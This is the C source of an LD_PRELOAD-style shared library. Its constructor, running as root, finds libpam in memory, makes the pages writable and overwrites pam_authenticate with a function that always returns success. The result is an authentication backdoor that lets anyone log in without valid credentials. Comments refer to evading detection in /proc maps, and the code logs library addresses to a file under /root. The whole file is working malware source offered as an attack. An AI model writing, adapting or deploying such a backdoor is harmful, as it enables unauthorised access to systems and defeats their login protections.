#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <errno.h>
#include <signal.h>

#include <security/pam_appl.h>
#include <sys/mman.h>

#include <dlfcn.h>
#include <link.h>

void handlesigsegv(int sig)
{
	//TODO
	//unregister us
	signal(sig, SIG_DFL);
	kill(getpid(), sig);
}

void nops(void)
{
	__asm__ __volatile__ 
			(
				"nop;"
				"nop;"
				"nop;"
				"nop;"
				"nop;"
			);
}

int retzero(pam_handle_t *x, int i)
{
	return 0;
}

int (*ref_pam_authptr) (pam_handle_t *, int);

typedef struct {
	const char *dli_fname;
	void *dli_fbase;
	const char *dli_sname;
	void *dli_saddr;
} Dl_info;

int (*dlinfoptr) (void *, int, void *); 
int (*dladdrptr) (void *, Dl_info *);



 __attribute__((constructor)) void bad(void) 
{
	if (getuid() != 0) //TODO FIX: this will break userspace crap otherwise
		return;

	/* get handles to dlinfo() and dladdr() because lazy */	
	void *dlhandle = dlopen("libdl-2.13.so", RTLD_NOW);
	dlinfoptr = dlsym(dlhandle, "dlinfo");
	dladdrptr = dlsym(dlhandle, "dladdr");
	dlclose(dlhandle);


	FILE *fp;
	fp = fopen("/root/asf", "w+");
	
	struct link_map *map;
	void *ourhandle = dlopen(NULL, 	RTLD_NOW);
	dlinfoptr(ourhandle, 2, &map);

	Dl_info *dli = malloc(sizeof(Dl_info));

	/* we have a map of all loaded libraries, 
	 * now iterate through them until we get to an interesting one (libpam)
	 * take libpam's load address and check for interesting function pointers using dladdr()
	 */
	while (map != NULL) { 
		fprintf(fp, "%p : %s\n", (void *)map->l_addr, map->l_name);
		if (strstr(map->l_name, "libpam.so.0") != NULL) {
			void *libstart = (void *)map->l_addr; // libpam loaded here -- confirm /proc/$PID/maps 
			
			void *libend = (void *)map->l_next->l_addr; 
		
			bool done = false;
			while (done != true && libstart >= libend) {  
				dladdrptr(libstart, dli);
					
				if (dli->dli_sname != NULL && dli->dli_saddr != NULL) {
					if (strcmp(dli->dli_sname, "pam_authenticate") == 0) {
						fprintf(fp, "got pam_authenticate @ %p\n", dli->dli_saddr);
						fflush(fp);
						
						signal(SIGSEGV, handlesigsegv);
			
						/* we know that libpam was loaded page aligned
						 * and that l_saddr (pam_authenticate()) lives within 3 pages of libpam(l_addr)
						 * so make these pages writable, and overwite what lives at pam_authenticate()
						 * FIXME: the stack frame SHOULD get fixed for us, it does on my system at least
						 * TODO: use real math to calculate how many pages to write instead of pagesize*3
						 *   so we can do this dynamically. 
						 * FIXME: we are marking extra memory (above us)as READ|EXEC that should be PROT_NONE and will be detected in /proc/$PID/maps
						 *   but fixing above TODO should fix this.  
						 */
						int pagesize = getpagesize();	
						mprotect((void *) map->l_addr, (pagesize * 3), PROT_READ | PROT_WRITE | PROT_EXEC);
					
						memcpy(dli->dli_saddr, retzero, 20);/* known good--4 byte alignment(? - retzero() is 17 bytes according to objdump?) */
						fprintf(fp, "us = %p above=%p below=%p\n", map->l_addr, map->l_prev->l_addr, map->l_next->l_addr);
						
						mprotect((void *) map->l_addr, (pagesize * 3),  PROT_READ | PROT_EXEC);
						done = true;
					}
				}
				libstart += 16; // XXX: testme += 64
			}	
			//err();
		}
		map = map->l_next;
	} 
	fclose(fp);
	
	return;
}
